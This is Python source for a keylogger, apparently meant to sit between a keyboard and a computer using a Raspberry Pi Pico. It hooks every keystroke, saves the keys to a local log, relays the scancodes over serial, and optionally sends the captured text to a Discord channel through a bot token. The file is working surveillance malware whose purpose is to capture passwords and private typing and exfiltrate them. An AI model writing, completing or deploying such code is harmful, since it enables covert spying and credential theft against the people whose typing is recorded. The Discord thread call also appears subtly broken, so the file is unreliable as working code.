'''
This file is used to Log the key inputs and send the keycodes to the raspberry pi pico
'''
from usb_packets import scancode_to_packet
import threading
import os
import keyboard as k
import datetime
import serial
from send_discord import ENABLE_DISCORD_LOGGING , YOUR_CHANNEL_ID, YOUR_TOKEN , buffer_path , run_bot
SCRIPT_PATH = os.path.dirname(os.path.abspath(__file__))
NULL_CHAR = chr(0)

path_log = f"{SCRIPT_PATH}/Log.txt"
serial_port = r'/dev/ttyS0'

ser = serial.Serial(serial_port, baudrate=9600, timeout=1)
shift_pressed = False

discord_thread = None
if ENABLE_DISCORD_LOGGING:
    discord_thread = threading.Thread(run_bot)
    discord_thread.daemon = True
    discord_thread.start()
def on_key_event(e):
    global shift_pressed
    if ENABLE_DISCORD_LOGGING and not discord_thread.is_alive():
        restart_discord_thread()
    pressed_events = k._pressed_events
    print(pressed_events)
    scancodes = [str(scancode_to_packet[event]) for event in pressed_events if pressed_events[event].event_type=="down"]

    try:
        if "225" in scancodes or "229" in scancodes:
            shift_pressed = True
        elif shift_pressed:
            shift_pressed = False
            log("(RShift)")
        if scancodes:
            ser.write((",".join(scancodes)+",\n").encode("utf-8"))

        else:
            ser.write("0,\n".encode("utf-8"))

    except Exception as ex:
        print("couldn't send data", ex)

    if e.event_type == k.KEY_DOWN:


        
        try:
            if len(e.name) > 1 and e.name != "space":
                log(f"({e.name})")
            elif e.name == "space":
                log(" ")
            else:
                log(e.name)

        except Exception as ex:
            print(f"Error writing event to log: {str(ex)}")
def log(message:str):
    with open(path_log, "a") as log:
        log.write(message)
    if ENABLE_DISCORD_LOGGING:
        with open(buffer_path,"a") as discord_log:
            discord_log.write(message)
def restart_discord_thread():
    global discord_thread
    discord_thread = threading.Thread(run_bot)
    discord_thread.daemon = True
    discord_thread.start()


def setup():
    with open(path_log, "a") as log:
        log.write(f"\n============New Session=========\n{datetime.datetime.now().date()}\n{datetime.datetime.now().strftime('%H:%M:%S')}\n")
if __name__ == "__main__":
        try:
            setup()



            k.hook(on_key_event)
            k.wait()
        except KeyboardInterrupt:
            print("closing")
            ser.write("0,\n".encode("utf-8"))
            quit()